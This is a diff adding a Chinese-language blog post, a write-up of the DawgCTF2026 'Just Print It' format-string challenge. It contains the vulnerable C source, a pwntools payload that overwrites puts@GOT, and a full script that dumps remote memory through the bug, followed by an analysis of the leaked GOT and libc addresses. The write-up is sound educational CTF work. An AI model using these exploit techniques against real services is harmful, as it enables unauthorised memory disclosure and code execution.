@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"cuo-kokomi.github.io","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"default"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"flat"},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="一道只给源码、不给二进制的格式化字符串题。本地自行编译后秒通，但远程 win 地址和本地编译产物对不上 —— 用同一个格式化字符串漏洞的任意读，把远程 .text 和 .got.plt 整段 dump 下来，找到真实地址后改写 puts@GOT 拿到 flag。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DawgCTF2026 Just Print It">
+<meta property="og:url" content="https://cuo-kokomi.github.io/2026/04/12/dawgctf2026-just-print-it/index.html">
+<meta property="og:site_name" content="CuO">
+<meta property="og:description" content="一道只给源码、不给二进制的格式化字符串题。本地自行编译后秒通，但远程 win 地址和本地编译产物对不上 —— 用同一个格式化字符串漏洞的任意读，把远程 .text 和 .got.plt 整段 dump 下来，找到真实地址后改写 puts@GOT 拿到 flag。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-04-12T04:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-22T10:08:50.852Z">
+<meta property="article:author" content="CuO">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="格式化字符串">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://cuo-kokomi.github.io/2026/04/12/dawgctf2026-just-print-it/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://cuo-kokomi.github.io/2026/04/12/dawgctf2026-just-print-it/","path":"2026/04/12/dawgctf2026-just-print-it/","title":"DawgCTF2026 Just Print It"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>DawgCTF2026 Just Print It | CuO</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+<link rel="preconnect" href="https://cdn.jsdelivr.net">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.7.0/lxgwwenkai-regular.css">
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">CuO</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%A6%82%E8%BF%B0"><span class="nav-text">题目概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B8%A9%E5%9D%91%EF%BC%9A%E8%BF%9C%E7%A8%8B%E5%9C%B0%E5%9D%80%E5%92%8C%E6%9C%AC%E5%9C%B0%E5%AF%B9%E4%B8%8D%E4%B8%8A"><span class="nav-text">踩坑：远程地址和本地对不上</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E5%86%B3%EF%BC%9A%E7%94%A8%E5%90%8C%E4%B8%80%E4%B8%AA%E6%BC%8F%E6%B4%9E-dump-%E8%BF%9C%E7%A8%8B%E5%86%85%E5%AD%98"><span class="nav-text">解决：用同一个漏洞 dump 远程内存</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#dump-py"><span class="nav-text">dump.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8E-dump-%E9%87%8C%E6%89%BE%E5%88%B0%E7%9C%9F%E5%AE%9E-win"><span class="nav-text">从 dump 里找到真实 win</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%9D%E5%A4%96%E6%94%B6%E8%8E%B7%EF%BC%9AGOT-%E9%87%8C%E7%9A%84-libc-%E5%9C%B0%E5%9D%80"><span class="nav-text">额外收获：GOT 里的 libc 地址</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%80%E7%BB%88%E5%88%A9%E7%94%A8"><span class="nav-text">最终利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93-%E7%BB%8F%E9%AA%8C"><span class="nav-text">总结 &#x2F; 经验</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">CuO</p>
+  <div class="site-description" itemprop="description">Security Research & CTF Writeups</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/CuO-kokomi" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;CuO-kokomi" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+<div class="post-list-widget motion-element">
+  <div class="post-list-widget-title">
+    <i class="fa fa-folder-open"></i> 文章列表
+  </div>
+  <ul class="post-list-widget-list">
+    <li class="post-list-widget-item">
+      <a href="/2026/06/21/tapo-c200-root/" title="TP-Link Tapo C200 v5.0 固件安全研究">TP-Link Tapo C200 v5.0 固件安全研究</a>
+    </li>
+    <li class="post-list-widget-item">
+      <a href="/2026/06/16/typora-license-bypass-windows/" title="Typora 激活逻辑逆向 (Windows)">Typora 激活逻辑逆向 (Windows)</a>
+    </li>
+    <li class="post-list-widget-item">
+      <a href="/2026/06/13/typora-license-bypass-macos/" title="Typora 激活逻辑逆向 (macOS)">Typora 激活逻辑逆向 (macOS)</a>
+    </li>
+    <li class="post-list-widget-item active">
+      <a href="/2026/04/12/dawgctf2026-just-print-it/" title="DawgCTF2026 Just Print It">DawgCTF2026 Just Print It</a>
+    </li>
+    <li class="post-list-widget-item">
+      <a href="/2026/03/10/adrift/" title="HGAME2026 adrift">HGAME2026 adrift</a>
+    </li>
+    <li class="post-list-widget-item">
+      <a href="/2026/03/06/Heap1sEz/" title="HGAME2026 Heap1sEz">HGAME2026 Heap1sEz</a>
+    </li>
+  </ul>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://cuo-kokomi.github.io/2026/04/12/dawgctf2026-just-print-it/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="CuO">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CuO">
+      <meta itemprop="description" content="Security Research & CTF Writeups">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="DawgCTF2026 Just Print It | CuO">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DawgCTF2026 Just Print It
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-04-12 12:00:00" itemprop="dateCreated datePublished" datetime="2026-04-12T12:00:00+08:00">2026-04-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF-Writeup/" itemprop="url" rel="index"><span itemprop="name">CTF Writeup</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>一道只给源码、不给二进制的格式化字符串题。本地自行编译后秒通，但远程 <code>win</code> 地址和本地编译产物对不上 —— 用同一个格式化字符串漏洞的任意读，把远程 <code>.text</code> 和 <code>.got.plt</code> 整段 dump 下来，找到真实地址后改写 <code>puts@GOT</code> 拿到 flag。</p>
+<span id="more"></span>
+
+<h2 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h2><p>题目只给了一个交互式服务 <code>nc nc.umbccd.net 8925</code>，没有提供二进制，提供的是源码 <code>in.c</code>，编译命令在文件头注释里：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -no-pie -z execstack -g -Wno-implicit-function-declaration in.c -o out</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">128</span>];</span><br><span class="line">    fp = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fp) &#123; <span class="built_in">puts</span>(<span class="string">&quot;Error opening flag file.&quot;</span>); fflush(<span class="built_in">stdout</span>); <span class="built_in">exit</span>(<span class="number">1</span>); &#125;</span><br><span class="line">    fgets(flag, <span class="keyword">sizeof</span>(flag), fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Flag: %s\n&quot;</span>, flag);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">128</span>];</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>); setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>); setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    fgets(buffer, <span class="keyword">sizeof</span>(buffer), <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buffer);          <span class="comment">// &lt;-- 漏洞点</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nGoodbye!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>保护：<code>-no-pie</code>（地址固定）、<code>-fno-stack-protector</code>（无 canary）。</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><code>printf(buffer)</code> <strong>格式化字符串漏洞</strong></p>
+<p>思路把 <code>puts</code> 的 GOT 表项 (<code>0x404000</code>) 改写成 <code>win</code> 的地址，下一次 <code>puts</code> 就会跳进 <code>win()</code>，打印 flag。</p>
+<p>格式串在栈上的参数偏移为 <strong>6</strong>，用pwntools生成payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fmtstr_payload(<span class="number">6</span>, &#123;puts: win&#125;)</span><br></pre></td></tr></table></figure>
+
+<h2 id="踩坑：远程地址和本地对不上"><a href="#踩坑：远程地址和本地对不上" class="headerlink" title="踩坑：远程地址和本地对不上"></a>踩坑：远程地址和本地对不上</h2><p>题目没给二进制，于是本地用 <code>in.c</code> 自行 <code>gcc</code> 编译出 <code>out</code> 来调试。本地很快打通：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 本地</span></span><br><span class="line">win = <span class="number">0x401216</span>   <span class="comment"># 本地 out 中 win 的入口</span></span><br><span class="line">puts = <span class="number">0x404000</span></span><br><span class="line">pay = fmtstr_payload(<span class="number">6</span>, &#123;puts: win&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>但<strong>同样的脚本打远程一直失败</strong>。根本原因：本地自行编译的产物和远程的二进制<strong>函数布局不同</strong>。虽然 <code>-no-pie</code> 地址固定，但两次编译（编译器版本&#x2F;选项细节差异）会让各函数的偏移不一样：</p>
+<ul>
+<li>本地 <code>out</code>：<code>win</code> 入口在 <code>0x401216</code></li>
+<li>远程：<code>win</code> 入口在 <code>0x401190</code></li>
+</ul>
+<p>照搬本地的 <code>0x401216</code> 去打远程，自然改写到的是错误的地址。</p>
+<h2 id="解决：用同一个漏洞-dump-远程内存"><a href="#解决：用同一个漏洞-dump-远程内存" class="headerlink" title="解决：用同一个漏洞 dump 远程内存"></a>解决：用同一个漏洞 dump 远程内存</h2><p>既然没有远程二进制，就用<strong>格式化字符串的任意读</strong>把远程关键段整段拉下来。</p>
+<p>（参考XSWCTF2025的题目<code>nofile</code>）</p>
+<p>思路：把要读的地址放在栈偏移 9，用 <code>%9$s</code> 读出该地址处直到 <code>\x00</code> 的字节；格式串本身放在偏移 6，填充到 24 字节（&#x3D; 偏移 6、7、8 三个 qword）后紧跟 <code>p64(addr)</code>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fmt = <span class="string">b&#x27;LEAK:%9$s:END&#x27;</span>        <span class="comment"># 14 bytes</span></span><br><span class="line">payload = fmt + <span class="string">b&#x27;A&#x27;</span>*(<span class="number">24</span>-<span class="built_in">len</span>(fmt)) + p64(addr)   <span class="comment"># addr 落在 %9$ 位置</span></span><br></pre></td></tr></table></figure>
+
+<p>逐字节推进（遇到 <code>\x00</code> 跳过 1 字节）即可 dump 任意范围。脚本 dump 了两段：</p>
+<ul>
+<li><p><code>.text</code>：<code>0x401000 – 0x401400</code> → <code>remote_text.bin</code></p>
+</li>
+<li><p><code>.got.plt</code>：<code>0x403fe8 – 0x404040</code> → <code>remote_got.bin</code></p>
+</li>
+</ul>
+<h3 id="dump-py"><a href="#dump-py" class="headerlink" title="dump.py"></a>dump.py</h3>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;error&#x27;</span>  <span class="comment"># 减少噪音</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_at</span>(<span class="params">addr</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;用 %s 泄露 addr 处的字节，遇到 \x00 停止，返回 (bytes, 实际读到的长度)&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;nc.umbccd.net&#x27;</span>, <span class="number">8925</span>, timeout=<span class="number">10</span>)</span><br><span class="line">        marker = <span class="string">b&#x27;LEAK:&#x27;</span></span><br><span class="line">        end_marker = <span class="string">b&#x27;:END&#x27;</span></span><br><span class="line">        fmt = marker + <span class="string">b&#x27;%9$s&#x27;</span> + end_marker</span><br><span class="line">        <span class="comment"># fmt = b&#x27;LEAK:%9$s:END&#x27; = 14 bytes, pad to 24</span></span><br><span class="line">        pad_len = <span class="number">24</span> - <span class="built_in">len</span>(fmt)</span><br><span class="line">        payload = fmt + <span class="string">b&#x27;A&#x27;</span> * pad_len + p64(addr)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        data = p.recvall(timeout=<span class="number">5</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> marker <span class="keyword">in</span> data <span class="keyword">and</span> end_marker <span class="keyword">in</span> data:</span><br><span class="line">            leaked = data.split(marker)[<span class="number">1</span>].split(end_marker)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">return</span> leaked</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_range</span>(<span class="params">start, end, outfile</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;dump [start, end) 范围的远程内存&quot;&quot;&quot;</span></span><br><span class="line">    size = end - start</span><br><span class="line">    result = <span class="built_in">bytearray</span>(<span class="string">b&#x27;\x00&#x27;</span> * size)</span><br><span class="line">    cursor = start</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> cursor &lt; end:</span><br><span class="line">        offset = cursor - start</span><br><span class="line">        leaked = leak_at(cursor)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(leaked) == <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># 当前地址是 \x00，跳过</span></span><br><span class="line">            <span class="comment"># result[offset] 已经是 \x00</span></span><br><span class="line">            cursor += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 写入泄露的字节</span></span><br><span class="line">            <span class="keyword">for</span> i, b <span class="keyword">in</span> <span class="built_in">enumerate</span>(leaked):</span><br><span class="line">                <span class="keyword">if</span> offset + i &lt; size:</span><br><span class="line">                    result[offset + i] = b</span><br><span class="line">            cursor += <span class="built_in">len</span>(leaked)</span><br><span class="line">            <span class="comment"># cursor 现在指向一个 \x00 字节</span></span><br><span class="line">            cursor += <span class="number">1</span>  <span class="comment"># 跳过那个 \x00</span></span><br><span class="line"></span><br><span class="line">        progress = (cursor - start) / size * <span class="number">100</span></span><br><span class="line">        sys.stdout.write(<span class="string">f&#x27;\r[<span class="subst">&#123;count&#125;</span> reqs] 0x<span class="subst">&#123;cursor:x&#125;</span> / 0x<span class="subst">&#123;end:x&#125;</span> (<span class="subst">&#123;progress:<span class="number">.1</span>f&#125;</span>%)&#x27;</span>)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(outfile, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(result)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Dumped <span class="subst">&#123;size&#125;</span> bytes to <span class="subst">&#123;outfile&#125;</span> in <span class="subst">&#123;count&#125;</span> requests&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># dump 关键段:</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=== Dumping .text (0x401000 - 0x401400) ===&quot;</span>)</span><br><span class="line">dump_range(<span class="number">0x401000</span>, <span class="number">0x401400</span>, <span class="string">&#x27;/mnt/c/Users/chen/Desktop/2/remote_text.bin&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n=== Dumping .got.plt (0x403fe8 - 0x404040) ===&quot;</span>)</span><br><span class="line">dump_range(<span class="number">0x403fe8</span>, <span class="number">0x404040</span>, <span class="string">&#x27;/mnt/c/Users/chen/Desktop/2/remote_got.bin&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="从-dump-里找到真实-win"><a href="#从-dump-里找到真实-win" class="headerlink" title="从 dump 里找到真实 win"></a>从 dump 里找到真实 win</h3><p>扫描 <code>remote_text.bin</code> 里的函数入口（<code>endbr64 = f3 0f 1e fa</code>）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x401000, 0x4010b0, 0x4010e0, 0x401160, 0x401190, 0x4012dc</span><br></pre></td></tr></table></figure>
+
+<p>注意 <code>0x401190</code> 处的字节是 <code>f3 0f 1e fa | eb 8a | 55 48 89 e5 ...</code>，即 <code>endbr64; jmp 0x401120</code> 的一个桩，并不是 <code>win</code>。真正的 <code>win</code> 函数体——<code>push rbp; mov rbp,rsp; sub rsp,0x90</code> 后用 <code>lea</code> 加载 <code>&quot;flag.txt&quot;</code> 字符串——从 <code>0x401196</code> 开始（与本地 <code>out</code> 中 <code>win</code> 的 prologue 序列一致，只是整体偏移不同）。payload 直接跳到 <code>0x401196</code>，打远程成功。</p>
+<h3 id="额外收获：GOT-里的-libc-地址"><a href="#额外收获：GOT-里的-libc-地址" class="headerlink" title="额外收获：GOT 里的 libc 地址"></a>额外收获：GOT 里的 libc 地址</h3><p>解析 <code>remote_got.bin</code>（起始 <code>0x403fe8</code>）：</p>
+<table>
+<thead>
+<tr>
+<th>地址</th>
+<th>内容</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0x403fe8</td>
+<td>0x403df8</td>
+<td><code>_DYNAMIC</code></td>
+</tr>
+<tr>
+<td>0x403ff0</td>
+<td>0x7ffff7ffe5f0</td>
+<td>link_map (GOT[1])</td>
+</tr>
+<tr>
+<td>0x403ff8</td>
+<td>0x7ffff7fda340</td>
+<td><code>_dl_runtime_resolve</code> (GOT[2])</td>
+</tr>
+<tr>
+<td>0x404000</td>
+<td>0x401036</td>
+<td>puts@plt+6（未解析）</td>
+</tr>
+<tr>
+<td>0x404008</td>
+<td>0x401046</td>
+<td>fclose@plt+6（未解析）</td>
+</tr>
+<tr>
+<td>0x404010</td>
+<td>0x7ffff7e4e920</td>
+<td><strong>setbuf</strong>（已解析，libc）</td>
+</tr>
+<tr>
+<td>0x404018</td>
+<td>0x7ffff7e20900</td>
+<td><strong>printf</strong>（已解析，libc）</td>
+</tr>
+<tr>
+<td>0x404020</td>
+<td>0x7ffff7e45670</td>
+<td><strong>fgets</strong>（已解析，libc）</td>
+</tr>
+<tr>
+<td>0x404028</td>
+<td>0x7ffff7e45350</td>
+<td><strong>fflush</strong>（已解析，libc）</td>
+</tr>
+<tr>
+<td>0x404030</td>
+<td>0x401096</td>
+<td>fopen@plt+6（未解析）</td>
+</tr>
+<tr>
+<td>0x404038</td>
+<td>0x4010a6</td>
+<td>exit@plt+6（未解析）</td>
+</tr>
+</tbody></table>
+<p>dump 发生在 <code>main</code> 的 <code>printf</code> 处：此前已调用过 <code>setbuf×3 / fflush / fgets / printf</code>，故这些是已解析的 libc 真实地址；而 <code>puts / fopen / exit / fclose</code> 尚未被调用，仍指向各自 PLT stub。</p>
+<p>这意味着即使没有 <code>win</code>，也能由此泄露 libc base、走 <code>system(&quot;/bin/sh&quot;)</code> &#x2F; one_gadget 路线。但本题直接改 <code>puts → win</code> 最省事。</p>
